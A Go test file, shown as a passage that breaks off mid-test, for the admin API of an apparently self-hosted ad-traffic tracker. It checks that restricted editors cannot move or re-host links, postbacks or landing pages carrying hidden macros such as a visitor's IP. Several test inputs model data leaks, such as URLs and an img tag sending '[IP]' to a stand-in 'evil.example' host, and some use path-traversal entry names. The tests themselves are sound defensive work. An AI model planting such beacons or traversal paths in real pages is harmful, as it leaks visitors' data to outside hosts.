package admin

import (
	"net/http"
	"strings"
	"testing"

	"github.com/hasayone/empataso-tds/internal/config"
	"github.com/hasayone/empataso-tds/internal/render"
)

// resetCampaign restores the stored campaign c1 to g.
func (r *rolesRig) resetCampaign(g config.Group) {
	r.storedGroups().list[0] = g
}

// putCampaign sends g as the user and returns the status.
func (r *rolesRig) putCampaign(t *testing.T, g config.Group) int {
	t.Helper()
	code, _ := r.api(t, r.user, r.ucsrf, http.MethodPut, "/api/groups/"+g.ID, g)
	return code
}

// plainCampaign is c1 with the given default output.
func plainCampaign(out string) config.Group {
	return config.Group{ID: "c1", Name: "one", Status: true, Redirect: "stop", Out: out}
}

// streamCampaign is c1 with two named streams that send to the given addresses.
func streamCampaign(a, b string) config.Group {
	g := plainCampaign("")
	g.Streams = []config.Stream{
		{Name: "A", Status: true, Out: config.Output{Redirect: "http_redirect", Out: a}},
		{Name: "B", Status: true, Out: config.Output{Redirect: "http_redirect", Out: b}},
	}
	return g
}

func TestCampaignParameterOfHiddenFieldStaysFixed(t *testing.T) {
	v := viewer{hidden: expandHidden([]string{"keyword"})}
	old := config.Group{ID: "c1", SourceID: "s"}
	next := old
	next.Parameters = map[string]string{"keyword": "utm_term"}
	sources := []config.TrafficSource{{ID: "s", Parameters: map[string]string{"sub_id_1": "sub1"}}}
	if msg := validateGroupParams(v, []config.Group{old}, []config.Group{next}, sources); msg != "source parameter keyword belongs to a hidden field" {
		t.Fatalf("hidden keyword: %q", msg)
	}
	visible := old
	visible.Parameters = map[string]string{"sub_id_1": "clickid"}
	visible.ParamTokens = map[string]string{"sub_id_1": "{click}"}
	if msg := validateGroupParams(v, []config.Group{old}, []config.Group{visible}, sources); msg != "" {
		t.Fatalf("visible sub id: %q", msg)
	}
	admin := viewer{admin: true, hidden: expandHidden([]string{"keyword"})}
	if msg := validateGroupParams(admin, []config.Group{old}, []config.Group{next}, sources); msg != "" {
		t.Fatalf("administrator: %q", msg)
	}
}

func TestPrepareGroupParamsTrimsAndRejects(t *testing.T) {
	g := config.Group{Parameters: map[string]string{"keyword": " utm "}, ParamTokens: map[string]string{"keyword": "  "}}
	if msg := prepareGroupParams(&g); msg != "" {
		t.Fatal(msg)
	}
	if g.Parameters["keyword"] != "utm" || g.ParamTokens != nil {
		t.Fatalf("cleaned %+v %+v", g.Parameters, g.ParamTokens)
	}
	bad := config.Group{Parameters: map[string]string{"nope": "x"}}
	if msg := prepareGroupParams(&bad); msg != "unknown parameter nope" {
		t.Fatalf("unknown: %q", msg)
	}
}

func TestCurlyMacroRefusedWhenQueryFieldHidden(t *testing.T) {
	rig := newRolesRig(t, "")
	cases := []struct {
		hidden []string
		out    string
		want   int
	}{
		{[]string{"sub_id_3"}, "https://t.example/?z={zone}", http.StatusBadRequest},
		{[]string{"keyword"}, "https://t.example/?z={zone}", http.StatusBadRequest},
		{[]string{"cost"}, "https://t.example/?z={zone}", http.StatusBadRequest},
		{[]string{"cost_cur"}, "https://t.example/?z={zone}", http.StatusBadRequest},
		{[]string{"sub_id_3"}, "https://t.example/?k={Keyword}", http.StatusBadRequest},
		{[]string{"sub_id_3"}, "https://t.example/?k={sub_id_31}", http.StatusBadRequest},
		{[]string{"sub_id_3"}, "https://t.example/?c={country}&s={sub_id_1}&o={offer}&i={subid}", http.StatusOK},
		{[]string{"sub_id_3"}, "https://t.example/?r={sub_id_30}", http.StatusOK},
		{[]string{"sub_id_3"}, "https://t.example/?z={a.b}", http.StatusOK},
		{[]string{"ip"}, "https://t.example/?z={zone}", http.StatusOK},
		{nil, "https://t.example/?z={zone}", http.StatusOK},
	}
	for _, c := range cases {
		rig.resetCampaign(plainCampaign(""))
		rig.setRole(t, editorAccess(c.hidden...))
		if got := rig.putCampaign(t, plainCampaign(c.out)); got != c.want {
			t.Errorf("hidden %v, %s: %d, want %d", c.hidden, c.out, got, c.want)
		}
	}

	rig.resetCampaign(plainCampaign("https://a.example/?z={zone}"))
	rig.setRole(t, editorAccess("sub_id_3"))
	renamed := plainCampaign("https://a.example/?z={zone}")
	renamed.Name = "renamed"
	if got := rig.putCampaign(t, renamed); got != http.StatusOK {
		t.Errorf("the link of the administrator kept as it is: %d", got)
	}
	if got := rig.putCampaign(t, plainCampaign("https://b.example/?z={zone}")); got != http.StatusBadRequest {
		t.Errorf("host changed in a link with {zone}: %d", got)
	}
}

func TestCurlyGuardMatchesRender(t *testing.T) {
	deps := render.MacroDeps{Query: func(string) (string, bool) { return "V", true }}
	g := &macroGuard{curly: true}
	names := []string{
		"zone", "a-b", "A_1", "Keyword", "sub_id_31", "sub_id_0", "a.b", "a b", "x",
		strings.Repeat("n", 23), strings.Repeat("n", 24), strings.Repeat("n", 25),
	}
	for _, name := range names {
		if curlyClassified(name) {
			continue
		}
		text := "{" + name + "}"
		expanded := render.Expand(text, deps) != text
		if flagged := g.find(text) != ""; flagged != expanded {
			t.Errorf("%q: render reads a parameter = %v, guard flags = %v", text, expanded, flagged)
		}
	}
}

func TestSourceParameterOfHiddenFieldIsLocked(t *testing.T) {
	rig := newRolesRig(t, "")
	seed := config.TrafficSource{ID: "s1", Name: "src", Parameters: map[string]string{"sub_id_3": "clickid", "sub_id_1": "p1"}}
	if code, raw := rig.adminAPI(t, http.MethodPost, "/api/traffic-sources", seed); code != http.StatusCreated {
		t.Fatalf("seed source %d %s", code, raw)
	}
	rig.setRole(t, editorAccess("sub_id_3"))
	put := func(params map[string]string, name string) int {
		code, _ := rig.api(t, rig.user, rig.ucsrf, http.MethodPut, "/api/traffic-sources/s1",
			config.TrafficSource{ID: "s1", Name: name, Parameters: params})
		return code
	}
	if got := put(map[string]string{"sub_id_3": "zone", "sub_id_1": "p1"}, "src"); got != http.StatusBadRequest {
		t.Errorf("sub_id_3 reassigned to zone: %d", got)
	}
	if got := put(map[string]string{"sub_id_1": "p1"}, "src"); got != http.StatusBadRequest {
		t.Errorf("sub_id_3 cleared: %d", got)
	}
	if got := put(map[string]string{"sub_id_3": "clickid", "sub_id_1": "p9"}, "renamed"); got != http.StatusOK {
		t.Errorf("a visible parameter changes with the hidden one kept: %d", got)
	}
	code, _ := rig.api(t, rig.user, rig.ucsrf, http.MethodPost, "/api/traffic-sources",
		config.TrafficSource{ID: "s2", Name: "new", Parameters: map[string]string{"sub_id_3": "zone"}})
	if code != http.StatusBadRequest {
		t.Errorf("new source with sub_id_3: %d", code)
	}
	code, _ = rig.api(t, rig.user, rig.ucsrf, http.MethodPost, "/api/traffic-sources",
		config.TrafficSource{ID: "s3", Name: "new", Parameters: map[string]string{"sub_id_2": "zone"}})
	if code != http.StatusCreated {
		t.Errorf("new source with a visible Sub ID: %d", code)
	}

	rig.setRole(t, editorAccess("keyword"))
	if got := put(map[string]string{"keyword": "q", "sub_id_3": "clickid"}, "renamed"); got != http.StatusBadRequest {
		t.Errorf("keyword mapped while hidden: %d", got)
	}
	rig.setRole(t, editorAccess())
	if got := put(map[string]string{"sub_id_3": "zone"}, "renamed"); got != http.StatusOK {
		t.Errorf("nothing hidden: %d", got)
	}
}

func TestCampaignPriceAndSourceRebindRefused(t *testing.T) {
	rig := newRolesRig(t, "")
	for _, src := range []config.TrafficSource{
		{ID: "s2", Name: "maps3", Parameters: map[string]string{"sub_id_3": "zone"}},
		{ID: "s3", Name: "maps1", Parameters: map[string]string{"sub_id_1": "zone"}},
	} {
		if code, raw := rig.adminAPI(t, http.MethodPost, "/api/traffic-sources", src); code != http.StatusCreated {
			t.Fatalf("seed source %d %s", code, raw)
		}
	}
	base := plainCampaign("https://a.example/?z={zone}")
	base.CostParam, base.CurrencyParam = "price", "cur"
	rig.resetCampaign(base)

	rig.setRole(t, editorAccess("cost"))
	other := base
	other.CostParam = "zone"
	if got := rig.putCampaign(t, other); got != http.StatusBadRequest {
		t.Errorf("CostParam moved onto zone: %d", got)
	}
	other = base
	other.CurrencyParam = "zone"
	if got := rig.putCampaign(t, other); got != http.StatusBadRequest {
		t.Errorf("CurrencyParam moved onto zone: %d", got)
	}
	same := base
	same.Name = "renamed"
	if got := rig.putCampaign(t, same); got != http.StatusOK {
		t.Errorf("price parameters kept: %d", got)
	}
	fresh := plainCampaign("https://a.example/")
	fresh.ID, fresh.CostParam = "c9", "zone"
	if got := rig.putCampaign(t, fresh); got != http.StatusBadRequest {
		t.Errorf("new campaign with a price parameter: %d", got)
	}

	rig.resetCampaign(base)
	rig.setRole(t, editorAccess("sub_id_3"))
	other = base
	other.SourceID = "s2"
	if got := rig.putCampaign(t, other); got != http.StatusBadRequest {
		t.Errorf("source that maps hidden sub_id_3: %d", got)
	}
	other.SourceID = "s3"
	if got := rig.putCampaign(t, other); got != http.StatusOK {
		t.Errorf("source that maps only a visible Sub ID: %d", got)
	}

	rig.resetCampaign(base)
	rig.setRole(t, editorAccess("ip"))
	other = base
	other.CostParam, other.SourceID = "zone", "s2"
	if got := rig.putCampaign(t, other); got != http.StatusOK {
		t.Errorf("nothing of the price, keyword or Sub IDs hidden: %d", got)
	}
}

func TestHiddenMacroLinkKeepsVerbatimPlace(t *testing.T) {
	const withIP = "https://a.example/?ip=[IP]"
	rig := newRolesRig(t, "")
	rig.setRole(t, editorAccess("ip"))
	reset := func() { rig.resetCampaign(streamCampaign(withIP, "https://b.example/")) }

	host := streamCampaign("https://evil.example/?ip=[IP]", "https://b.example/")
	moved := streamCampaign("https://a2.example/", withIP)
	copied := streamCampaign(withIP, withIP)
	for name, g := range map[string]config.Group{"host changed": host, "moved to stream B": moved, "copied to stream B": copied} {
		reset()
		if got := rig.putCampaign(t, g); got != http.StatusBadRequest {
			t.Errorf("%s: %d", name, got)
		}
	}

	reset()
	neighbour := streamCampaign(withIP, "https://b2.example/")
	neighbour.Name, neighbour.Redirect = "renamed", "stop"
	neighbour.Streams[0].Weight = 5
	if got := rig.putCampaign(t, neighbour); got != http.StatusOK {
		t.Errorf("neighbouring fields changed: %d", got)
	}

	reset()
	swapped := streamCampaign(withIP, "https://b.example/")
	swapped.Streams[0], swapped.Streams[1] = swapped.Streams[1], swapped.Streams[0]
	if got := rig.putCampaign(t, swapped); got != http.StatusOK {
		t.Errorf("streams reordered, links unchanged: %d", got)
	}

	reset()
	moved = streamCampaign(withIP, "https://b.example/")
	moved.Out = withIP
	if got := rig.putCampaign(t, moved); got != http.StatusBadRequest {
		t.Errorf("moved to the campaign default output: %d", got)
	}
}

func TestHiddenMacroPostbackKeepsVerbatimPlace(t *testing.T) {
	rig := newRolesRig(t, "")
	pb := func(id, url string, statuses ...string) config.OutboundPostback {
		return config.OutboundPostback{ID: id, URL: url, Method: "GET", Statuses: statuses}
	}
	reset := func() {
		g := plainCampaign("")
		g.Postbacks = []config.OutboundPostback{pb("p1", "https://p.example/?ip=[IP]", "lead"), pb("p2", "https://q.example/", "lead")}
		rig.resetCampaign(g)
	}
	rig.setRole(t, editorAccess("ip"))
	put := func(list ...config.OutboundPostback) int {
		code, _ := rig.api(t, rig.user, rig.ucsrf, http.MethodPut, "/api/campaigns/c1/postbacks", list)
		return code
	}
	reset()
	if got := put(pb("p1", "https://other.example/?ip=[IP]", "lead"), pb("p2", "https://q.example/", "lead")); got != http.StatusBadRequest {
		t.Errorf("host changed: %d", got)
	}
	if got := put(pb("p1", "https://p.example/", "lead"), pb("p2", "https://p.example/?ip=[IP]", "lead")); got != http.StatusBadRequest {
		t.Errorf("moved to another postback: %d", got)
	}
	if got := put(pb("p2", "https://q.example/", "sale"), pb("p1", "https://p.example/?ip=[IP]", "lead", "sale")); got != http.StatusOK {
		t.Errorf("order and statuses changed, link kept: %d", got)
	}
}

func TestNetworkOfferQueryGuarded(t *testing.T) {
	rig := newRolesRig(t, "")
	rig.setRole(t, editorAccess("ip"))
	postNet := func(n config.AffiliateNetwork) int {
		code, _ := rig.api(t, rig.user, rig.ucsrf, http.MethodPost, "/api/affiliate-networks", n)
		return code
	}
	if got := postNet(config.AffiliateNetwork{ID: "mine", Name: "mine", OfferQuery: "sub1=[IP]"}); got != http.StatusBadRequest {
		t.Errorf("own network with [IP] in offer_query: %d", got)
	}
	if got := postNet(config.AffiliateNetwork{ID: "mine", Name: "mine", OfferQuery: "sub1={subid}&c=[COUNTRY]", PostbackURL: "https://n.example/?ip=[IP]&p={payout}"}); got != http.StatusCreated {
		t.Errorf("own network without hidden macros (PostbackURL is a note): %d", got)
	}

	for _, n := range []config.AffiliateNetwork{
		{ID: "bad", Name: "bad", Status: true, OfferQuery: "sub1=[IP]"},
		{ID: "good", Name: "good", Status: true, OfferQuery: "sub1={subid}"},
	} {
		if code, raw := rig.adminAPI(t, http.MethodPost, "/api/affiliate-networks", n); code != http.StatusCreated {
			t.Fatalf("seed network %d %s", code, raw)
		}
	}
	for _, o := range []config.Offer{
		{ID: "o1", Name: "o1", URL: "https://x.example/", Status: true, NetworkID: "bad"},
		{ID: "o2", Name: "o2", URL: "https://x.example/", Status: true},
	} {
		if code, raw := rig.adminAPI(t, http.MethodPost, "/api/offers", o); code != http.StatusCreated {
			t.Fatalf("seed offer %d %s", code, raw)
		}
	}
	postOffer := func(o config.Offer) int {
		code, _ := rig.api(t, rig.user, rig.ucsrf, http.MethodPost, "/api/offers", o)
		return code
	}
	putOffer := func(o config.Offer) int {
		code, _ := rig.api(t, rig.user, rig.ucsrf, http.MethodPut, "/api/offers/"+o.ID, o)
		return code
	}
	if got := postOffer(config.Offer{ID: "n1", Name: "n1", URL: "https://me.example/", Status: true, NetworkID: "bad"}); got != http.StatusBadRequest {
		t.Errorf("own offer on a network with [IP]: %d", got)
	}
	if got := postOffer(config.Offer{ID: "n2", Name: "n2", URL: "https://me.example/", Status: true, NetworkID: "good"}); got != http.StatusCreated {
		t.Errorf("own offer on a clean network: %d", got)
	}
	if got := putOffer(config.Offer{ID: "o2", Name: "o2", URL: "https://x.example/", Status: true, NetworkID: "bad"}); got != http.StatusBadRequest {
		t.Errorf("offer moved onto a network with [IP]: %d", got)
	}
	if got := putOffer(config.Offer{ID: "o1", Name: "o1", URL: "https://evil.example/", Status: true, NetworkID: "bad"}); got != http.StatusBadRequest {
		t.Errorf("address of an offer on such a network changed: %d", got)
	}
	if got := putOffer(config.Offer{ID: "o1", Name: "renamed", URL: "https://x.example/", Status: true, NetworkID: "bad"}); got != http.StatusOK {
		t.Errorf("rename of an offer on such a network: %d", got)
	}
	if got := putOffer(config.Offer{ID: "o1", Name: "renamed", URL: "https://x.example/", Status: true, NetworkID: "good"}); got != http.StatusOK {
		t.Errorf("offer moved off the network: %d", got)
	}

	if code, raw := rig.adminAPI(t, http.MethodPut, "/api/affiliate-networks/good", config.AffiliateNetwork{ID: "good", Name: "good", Status: true, OfferQuery: "sub1=[IP]"}); code != http.StatusOK {
		t.Fatalf("admin edit %d %s", code, raw)
	}
	putNet := func(n config.AffiliateNetwork) int {
		code, _ := rig.api(t, rig.user, rig.ucsrf, http.MethodPut, "/api/affiliate-networks/"+n.ID, n)
		return code
	}
	if got := putNet(config.AffiliateNetwork{ID: "good", Name: "renamed", Status: true, OfferQuery: "sub1=[IP]"}); got != http.StatusOK {
		t.Errorf("rename of a network, query kept: %d", got)
	}
	if got := putNet(config.AffiliateNetwork{ID: "good", Name: "renamed", Status: true, OfferQuery: "sub1=[IP]&x=1"}); got != http.StatusBadRequest {
		t.Errorf("query of the administrator edited: %d", got)
	}

	rig.setRole(t, editorAccess())
	if got := postOffer(config.Offer{ID: "n3", Name: "n3", URL: "https://me.example/", Status: true, NetworkID: "bad"}); got != http.StatusCreated {
		t.Errorf("nothing hidden, offer on a network with [IP]: %d", got)
	}
	if got := postNet(config.AffiliateNetwork{ID: "free", Name: "free", OfferQuery: "sub1=[IP]"}); got != http.StatusCreated {
		t.Errorf("nothing hidden, network with [IP]: %d", got)
	}
}

func TestStreamOutFrozenByCurlAndRemote(t *testing.T) {
	rig := newRolesRig(t, "")
	base := func() config.Group {
		g := streamCampaign("https://a.example/", "https://b.example/")
		g.Streams[0].Curl = "x=>[IP]"
		g.Streams[1].Remote = config.Remote{Enabled: true, URL: "https://r.example/?ip=[IP]"}
		return g
	}
	if code, raw := rig.adminAPI(t, http.MethodPost, "/api/offers", config.Offer{ID: "o9", Name: "o9", URL: "https://o.example/", Status: true}); code != http.StatusCreated {
		t.Fatalf("seed offer %d %s", code, raw)
	}
	rig.setRole(t, editorAccess("ip"))
	cases := map[string]struct {
		edit func(*config.Group)
		want int
	}{
		"out of a stream with Curl":      {func(g *config.Group) { g.Streams[0].Out.Out = "https://evil.example/" }, http.StatusBadRequest},
		"bot output of a stream":         {func(g *config.Group) { g.Streams[0].Bots.Out = "https://evil.example/" }, http.StatusBadRequest},
		"offers of a stream with Curl":   {func(g *config.Group) { g.Streams[0].Out.Offers = []config.ShareRef{{ID: "o9", Share: 10}} }, http.StatusBadRequest},
		"out of a stream with Remote":    {func(g *config.Group) { g.Streams[1].Out.Out = "https://evil.example/?r=[REMOTE]" }, http.StatusBadRequest},
		"weight of a frozen stream":      {func(g *config.Group) { g.Streams[0].Weight = 7; g.Name = "renamed" }, http.StatusOK},
		"bot toggles of a frozen stream": {func(g *config.Group) { g.Streams[1].Bots.CheckUA = true }, http.StatusOK},
		"group default output":           {func(g *config.Group) { g.Out = "https://other.example/" }, http.StatusOK},
	}
	for name, c := range cases {
		rig.resetCampaign(base())
		g := base()
		c.edit(&g)
		if got := rig.putCampaign(t, g); got != c.want {
			t.Errorf("%s: %d, want %d", name, got, c.want)
		}
	}

	plain := streamCampaign("https://a.example/", "https://b.example/")
	rig.resetCampaign(plain)
	plain.Streams[0].Out.Out = "https://changed.example/"
	if got := rig.putCampaign(t, plain); got != http.StatusOK {
		t.Errorf("output of a stream without hidden macros: %d", got)
	}
	rig.setRole(t, editorAccess())
	rig.resetCampaign(base())
	g := base()
	g.Streams[0].Out.Out = "https://free.example/"
	if got := rig.putCampaign(t, g); got != http.StatusOK {
		t.Errorf("nothing hidden: %d", got)
	}
}

func TestLandingPagesGuarded(t *testing.T) {
	rig := newRolesRig(t, "")
	if code, raw := rig.adminAPI(t, http.MethodPost, "/api/landings", config.Landing{ID: "lp1", Name: "lp", Local: true, Status: true}); code != http.StatusCreated {
		t.Fatalf("seed landing %d %s", code, raw)
	}
	url := rig.srv.URL + "/api/landings/lp1/"
	put := func(c *http.Client, csrf, path, body string) int {
		_, code := landingDo(t, c, http.MethodPut, url+"files/"+path, csrf, "text/plain", []byte(body))
		return code
	}
	if got := put(rig.admin, rig.csrf, "index.html", "<p>[IP]</p>"); got != http.StatusOK {
		t.Fatalf("administrator writes the page: %d", got)
	}
	rig.setRole(t, editorAccess("ip"))
	user := func(path, body string) int { return put(rig.user, rig.ucsrf, path, body) }
	if got := user("index.html", "<p>[IP]</p>"); got != http.StatusOK {
		t.Errorf("page saved as it is: %d", got)
	}
	if got := user("index.html", "<p>[IP]</p><img src=\"https://evil.example/?i=[IP]\">"); got != http.StatusBadRequest {
		t.Errorf("page changed around the macro: %d", got)
	}
	if got := user("other.html", "<p>[ip]</p>"); got != http.StatusBadRequest {
		t.Errorf("new page with the macro: %d", got)
	}
	if got := user("index.php", "<?php echo '{zone}'; ?>"); got != http.StatusOK {
		t.Errorf("{zone} is checked only when a keyword, Sub ID or price is hidden: %d", got)
	}
	if got := user("style.css", "a::after{content:'[IP]'}"); got != http.StatusBadRequest {
		t.Errorf("any file can become the entry, so a style file is checked: %d", got)
	}
	if got := user("sub/page.html", "<p>[IP]</p>"); got != http.StatusBadRequest {
		t.Errorf("a file in a directory is checked: %d", got)
	}
	if got := user("sub/clean.html", "<p>[COUNTRY]</p>"); got != http.StatusOK {
		t.Errorf("a macro of a visible field: %d", got)
	}

	post := func(files map[string]string) int {
		_, code := landingDo(t, rig.user, http.MethodPost, url+"archive", rig.ucsrf, "application/zip", zipBytes(t, files))
		return code
	}
	if got := post(map[string]string{"index.php": "<?php echo '{zone}'; ?>", "index.html": "<p>[IP]</p>", "a.css": "x"}); got != http.StatusOK {
		t.Errorf("archive with the stored page: %d", got)
	}
	if got := post(map[string]string{"site/index.html": "<p>[IP]!</p>"}); got != http.StatusBadRequest {
		t.Errorf("archive with a changed page: %d", got)
	}
	if got := post(map[string]string{"index.html": "<p>ok</p>", "x.html": "[USERAGENT]"}); got != http.StatusOK {
		t.Errorf("a macro of a field that is visible: %d", got)
	}
	rig.setRole(t, editorAccess())
	if got := user("other.html", "<p>[IP]</p>"); got != http.StatusOK {
		t.Errorf("nothing hidden: %d", got)
	}
}

func TestLandingEntryCannotReachAMacro(t *testing.T) {
	rig := newRolesRig(t, "")
	seed := func(entry string) {
		code, raw := rig.adminAPI(t, http.MethodPost, "/api/landings", config.Landing{ID: "lp2", Name: "lp", Local: true, Status: true, Entry: entry})
		if code != http.StatusCreated {
			t.Fatalf("seed landing %d %s", code, raw)
		}
	}
	seed("")
	url := rig.srv.URL + "/api/landings/lp2/"
	adminPut := func(path, body string) {
		if _, code := landingDo(t, rig.admin, http.MethodPut, url+"files/"+path, rig.csrf, "text/plain", []byte(body)); code != http.StatusOK {
			t.Fatalf("admin writes %s: %d", path, code)
		}
	}
	adminPut("sub/admin.html", "<p>[CID] [IP]</p>")
	adminPut("sub/clean.html", "hello")
	adminPut("index.php", "<?php ?>")
	adminPut("index.html", "<p>[IP]</p>")
	rig.setRole(t, editorAccess("cid", "ip"))

	put := func(path, body string) int {
		_, code := landingDo(t, rig.user, http.MethodPut, url+"files/"+path, rig.ucsrf, "text/plain", []byte(body))
		return code
	}
	if got := put("sub/p.txt", "c=[CID]"); got != http.StatusBadRequest {
		t.Errorf("entry file in a directory with .txt: %d", got)
	}
	if got := put("p.txt", "a=[cid]"); got != http.StatusBadRequest {
		t.Errorf("entry file .txt in the root: %d", got)
	}
	post := func(files map[string]string) int {
		_, code := landingDo(t, rig.user, http.MethodPost, url+"archive", rig.ucsrf, "application/zip", zipBytes(t, files))
		return code
	}
	if got := post(map[string]string{"entry": "c=[CID]"}); got != http.StatusBadRequest {
		t.Errorf("file without an extension in an archive: %d", got)
	}
	if got := post(map[string]string{"sub/p.txt": "c=[CID]", "index.html": "x"}); got != http.StatusBadRequest {
		t.Errorf("file in a directory of an archive: %d", got)
	}
	if got := post(map[string]string{"img.bin": "\x00\x01[ip]\x02"}); got != http.StatusBadRequest {
		t.Errorf("binary-looking file with a macro: %d", got)
	}

	putLanding := func(entry, name string) (int, string) {
		code, raw := rig.api(t, rig.user, rig.ucsrf, http.MethodPut, "/api/landings/lp2",
			config.Landing{ID: "lp2", Name: name, Local: true, Status: true, Entry: entry})
		return code, string(raw)
	}
	if got, raw := putLanding("sub/admin.html", "lp"); got != http.StatusBadRequest || !strings.Contains(raw, "sub/admin.html") {
		t.Errorf("entry moved to a file of the administrator with a macro: %d %s", got, raw)
	}
	if got, raw := putLanding("sub/clean.html", "lp"); got != http.StatusOK {
		t.Errorf("entry moved to a clean file: %d %s", got, raw)
	}
	if got, raw := putLanding("sub/clean.html", "renamed"); got != http.StatusOK {
		t.Errorf("rename with the entry kept: %d %s", got, raw)
	}
	if got, raw := putLanding("", "lp"); got != http.StatusOK {
		t.Errorf("entry reset to a default index.php that is clean: %d %s", got, raw)
	}

	del := func(path string) int {
		_, code := landingDo(t, rig.user, http.MethodDelete, url+"files/"+path, rig.ucsrf, "", nil)
		return code
	}
	if code, raw := rig.adminAPI(t, http.MethodPut, "/api/landings/lp2", config.Landing{ID: "lp2", Name: "lp", Local: true, Status: true}); code != http.StatusOK {
		t.Fatalf("admin resets the entry %d %s", code, raw)
	}
	if got := del("index.php"); got != http.StatusBadRequest {
		t.Errorf("removing index.php hands the entry to index.html with [IP]: %d", got)
	}
	if got := del("sub/clean.html"); got != http.StatusOK {
		t.Errorf("removing another file: %d", got)
	}
	if code, raw := rig.adminAPI(t, http.MethodPut, "/api/landings/lp2", config.Landing{ID: "lp2", Name: "lp", Local: true, Status: true, Entry: "sub/admin.html"}); code != http.StatusOK {
		t.Fatalf("admin sets the entry %d %s", code, raw)
	}
	if got := del("index.php"); got != http.StatusOK {
		t.Errorf("the entry is set, index.php is not the fallback: %d", got)
	}
	if got, raw := putLanding("", "lp"); got != http.StatusBadRequest || !strings.Contains(raw, "index.html") {
		t.Errorf("entry reset to a default that is index.html with [IP]: %d %s", got, raw)
	}

	rig.setRole(t, editorAccess())
	if got := put("sub/p.txt", "c=[CID]"); got != http.StatusOK {
		t.Errorf("nothing hidden, file: %d", got)
	}
	if got, raw := putLanding("sub/p.html", "lp"); got != http.StatusOK {
		t.Errorf("nothing hidden, entry: %d %s", got, raw)
	}
}

func TestLandingZipCannotSwapTheEntry(t *testing.T) {
	rig := newRolesRig(t, "")
	if code, raw := rig.adminAPI(t, http.MethodPost, "/api/landings", config.Landing{ID: "lp3", Name: "lp", Local: true, Status: true, Entry: "index.php"}); code != http.StatusCreated {
		t.Fatalf("seed landing %d %s", code, raw)
	}
	url := rig.srv.URL + "/api/landings/lp3/"
	adminPut := func(path, body string) {
		if _, code := landingDo(t, rig.admin, http.MethodPut, url+"files/"+path, rig.csrf, "text/plain", []byte(body)); code != http.StatusOK {
			t.Fatalf("admin writes %s: %d", path, code)
		}
	}
	adminPut("index.php", "<?php echo 1;")
	adminPut("index.html", "<p>[CID]</p>")
	rig.setRole(t, editorAccess("cid"))
	post := func(c *http.Client, csrf string, files map[string]string) int {
		_, code := landingDo(t, c, http.MethodPost, url+"archive", csrf, "application/zip", zipBytes(t, files))
		return code
	}
	user := func(files map[string]string) int { return post(rig.user, rig.ucsrf, files) }

	if got := user(map[string]string{"index.html": "<p>[CID]</p>"}); got != http.StatusBadRequest {
		t.Errorf("the page of the administrator, with the macro, becomes the entry: %d", got)
	}
	if got := user(map[string]string{"index.php": "<?php echo 2;", "index.html": "<p>[CID]</p>"}); got != http.StatusOK {
		t.Errorf("index.php stays the entry: %d", got)
	}
	if got := user(map[string]string{"index.php": "<?php echo 2;", "index.html": "<p>[CID]</p>"}); got != http.StatusOK {
		t.Errorf("the same archive again, entry unchanged: %d", got)
	}
	if got := user(map[string]string{"site/index.html": "<p>[CID]</p>"}); got != http.StatusBadRequest {
		t.Errorf("a shared top directory is stripped before the entry is chosen: %d", got)
	}

	if code, raw := rig.adminAPI(t, http.MethodPut, "/api/landings/lp3", config.Landing{ID: "lp3", Name: "lp", Local: true, Status: true, Entry: "index.html"}); code != http.StatusOK {
		t.Fatalf("admin sets the entry %d %s", code, raw)
	}
	if got := user(map[string]string{"index.html": "<p>[CID]</p>"}); got != http.StatusOK {
		t.Errorf("the same page stays the entry: %d", got)
	}
	if got := user(map[string]string{"index.html": "<p>[CID]!</p>"}); got != http.StatusBadRequest {
		t.Errorf("the entry page with other bytes: %d", got)
	}
	if got := post(rig.admin, rig.csrf, map[string]string{"index.html": "<p>[CID]!</p>"}); got != http.StatusOK {
		t.Errorf("administrator: %d", got)
	}
}

func TestLandingEntryTheEngineWouldIgnoreIsRefused(t *testing.T) {
	rig := newRolesRig(t, "")
	if code, raw := rig.adminAPI(t, http.MethodPost, "/api/landings", config.Landing{ID: "lp4", Name: "lp", Local: true, Status: true}); code != http.StatusCreated {
		t.Fatalf("seed landing %d %s", code, raw)
	}
	url := rig.srv.URL + "/api/landings/lp4/"
	if _, code := landingDo(t, rig.admin, http.MethodPut, url+"files/index.html", rig.csrf, "text/plain", []byte("<p>[CID]</p>")); code != http.StatusOK {
		t.Fatal(code)
	}
	for _, entry := range []string{"./missing.html", "../x.html", ".hidden", "a\\b.html", "/abs.html", "sub/../x"} {
		body := config.Landing{ID: "lp4", Name: "lp", Local: true, Status: true, Entry: entry}
		if code, _ := rig.adminAPI(t, http.MethodPut, "/api/landings/lp4", body); code != http.StatusBadRequest {
			t.Errorf("administrator, entry %q: %d", entry, code)
		}
	}
	rig.setRole(t, editorAccess("cid"))
	body := config.Landing{ID: "lp4", Name: "lp", Local: true, Status: true, Entry: "./missing.html"}
	if code, _ := rig.api(t, rig.user, rig.ucsrf, http.MethodPut, "/api/landings/lp4", body); code != http.StatusBadRequest {
		t.Errorf("user, entry ./missing.html with the page of the administrator holding [CID]: %d", code)
	}
	body.Entry = " sub/ok.html "
	if code, raw := rig.adminAPI(t, http.MethodPut, "/api/landings/lp4", body); code != http.StatusOK {
		t.Errorf("a safe entry with spaces around: %d %s", code, raw)
	}
}

func TestEntryResolutionIsTheEnginesRule(t *testing.T) {
	files := map[string]string{"index.php": "p", "index.html": "h", "sub/x.txt": "x"}
	cases := []struct {
		entry string
		have  []string
		want  string
	}{
		{"sub/x.txt", []string{"index.php", "index.html", "sub/x.txt"}, "sub/x.txt"},
		{"./missing.html", []string{"index.html"}, "index.html"},
		{"./missing.html", []string{"index.php", "index.html"}, "index.php"},
		{"", []string{"index.html"}, "index.html"},
		{"", []string{"other.html"}, ""},
		{"missing.html", []string{"index.html"}, "missing.html"},
		{" index.html ", []string{"index.php"}, "index.html"},
		{"a\\b", []string{"index.php"}, "index.php"},
	}
	for _, c := range cases {
		read := func(rel string) ([]byte, bool) {
			for _, h := range c.have {
				if h == rel {
					return []byte(files[rel]), true
				}
			}
			return nil, false
		}
		got := resolveEntryFile(c.entry, read)
		if got.rel != c.want {
			t.Errorf("entry %q over %v: %q, want %q", c.entry, c.have, got.rel, c.want)
		}
	}
}

func TestLandingCorruptArchiveRefusedForEveryoneAndChangesNothing(t *testing.T) {
	rig := newRolesRig(t, "")
	if code, raw := rig.adminAPI(t, http.MethodPost, "/api/landings", config.Landing{ID: "lp5", Name: "lp", Local: true, Status: true, Entry: "index.html"}); code != http.StatusCreated {
		t.Fatalf("seed landing %d %s", code, raw)
	}
	url := rig.srv.URL + "/api/landings/lp5/"
	for path, body := range map[string]string{"index.html": "keep", "old.txt": "old"} {
